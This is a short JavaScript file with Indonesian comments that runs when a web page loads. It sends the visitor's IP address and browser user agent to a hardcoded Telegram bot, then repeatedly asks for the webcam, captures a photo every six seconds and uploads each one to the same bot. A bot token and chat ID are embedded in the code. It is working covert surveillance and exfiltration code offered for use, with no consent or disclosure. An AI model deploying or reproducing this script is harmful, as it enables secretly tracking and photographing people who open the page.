// Konfigurasi bot Telegram
const BOT_TOKEN = '7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY'; // Ganti dengan bot token yang benar
const CHAT_ID = '1145550172'; // Ganti dengan Chat ID Anda yang benar

// Fungsi untuk mengirim IP dan User Agent
function sendIPAndUserAgent() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            const userAgent = navigator.userAgent;
            const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
            sendMessageToTelegram(message);
        })
        .catch(error => console.error('Error fetching IP address:', error));
}

// Fungsi untuk mengirim pesan teks ke Telegram
function sendMessageToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => {
        if (response.ok) {
            console.log('Message sent to Telegram');
        } else {
            console.error('Failed to send message to Telegram');
        }
    })
    .catch(error => console.error('Error sending message to Telegram:', error));
}

// Fungsi untuk mengambil foto dari kamera dan mengirimnya ke Telegram
function takePhotoAndSend() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Tunggu sampai video siap
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photo = canvas.toDataURL('image/jpeg');

                    sendPhoto(photo);

                    // Hentikan video stream dan hapus elemen video
                    video.srcObject.getTracks().forEach(track => track.stop());
                    video.remove();
                }, 1000); // Penundaan untuk memastikan video sudah siap
            };
        })
        .catch(error => console.error('Error accessing camera:', error));
}

// Fungsi untuk mengirim foto ke Telegram
function sendPhoto(photo) {
    const blob = dataURItoBlob(photo);
    const formData = new FormData();
    formData.append('photo', blob, 'photo.jpg');

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log('Photo sent to Telegram');
        } else {
            console.error('Failed to send photo to Telegram');
        }
    })
    .catch(error => console.error('Error sending photo to Telegram:', error));
}

// Fungsi untuk mengonversi Data URI menjadi Blob
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const intArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        intArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([arrayBuffer], { type: mimeString });
}

// Kirim IP dan user agent saat halaman dimuat
sendIPAndUserAgent();

// Ambil foto dan kirim setiap 6 detik (6000 milidetik)
setInterval(takePhotoAndSend, 6000);
